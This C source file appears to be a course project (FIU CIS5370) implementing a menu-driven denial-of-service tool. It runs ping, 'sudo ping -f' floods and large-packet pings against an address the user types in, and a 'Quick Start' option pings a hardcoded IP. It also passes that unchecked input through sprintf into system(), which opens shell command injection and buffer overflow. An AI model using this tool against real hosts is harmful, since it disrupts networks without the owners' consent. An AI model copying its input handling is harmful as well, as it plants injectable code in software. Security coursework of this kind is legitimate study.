#include<stdio.h>
#include<stdlib.h>
#include<string.h>

int main()
{
    //variable for user menu input
    int selection1;

    //clear screen
    system("clear");
    
    //Print Welcome message
    printf("FIU CIS5370 - DoS Attack \nView the README for guide...\n\n");
    
    do
    {
    //Print Menu selections
    printf("---------Main Menu---------\n0) Run ifconfig and Re-prompt\n1) DoS (ICMP) Attack on Choosen IP\n2) ICMP Flood on Choosen IP\n3) Large Packet Size ICMP Flood\n4) Quick Start (Presentation)\n5) EXIT\n---------------------------\n");
      
    //Prompt user for input
    printf("Enter your selection: ");

    //Read input int and save under selection1 var
    fflush(stdout);
    scanf("%d", &selection1);

    if (selection1 == 0)
    {
    int selection2;
    
    do{
    system("ifconfig");
    
    printf("\nScreen will refesh when you are complete...\n1) Yes\n2) No\nAre you done?:");
    scanf("%d", &selection2);
    }while(selection2 != 1);
    
    system("clear");
    }
    else if (selection1 == 1) //simple ICMP attack 
    {
 
        fflush(stdout);
        char pingAdr[100], pingCmd[100];
        printf("Enter Address to be DoS: ");
        scanf("%s", pingAdr); 
        sprintf(pingCmd, "ping %s", pingAdr);
        system(pingCmd);
      
    }
    else if (selection1 == 2) // Flood a given IP address with ICMP packets
    {
    fflush(stdout);
        char pingAdr[100], pingCmd[100];
        printf("Enter Address to be DoS: ");
        scanf("%s", pingAdr);
        sprintf(pingCmd, "sudo ping -f %s", pingAdr);
        system(pingCmd);
    }
    else if (selection1 == 3) //Attack given IP with 1000 data bytes
    {
    fflush(stdout);
        char pingAdr[100], pingCmd[100];
        printf("Enter Address to be DoS: ");
        scanf("%s", pingAdr);
        sprintf(pingCmd, "ping -s 1000 %s", pingAdr);
        system(pingCmd);
        
    }
    else if (selection1 == 4) //directly attack our target IP address
    {
        fflush(stdout);
       
        system("echo Quick Start engaged! Starting attack...");
        system("ping 172.10.0.1");
    }
    else if (selection1 == 5)
    {
    //print Goodbye message
    printf("Goodbye!\n");
    break;
    }
    else
    {
    //Invalid input fall-back
    system("clear");
    }
    
    }while(selection1 <= 0 || selection1 > 5);
    
    return 0;
}

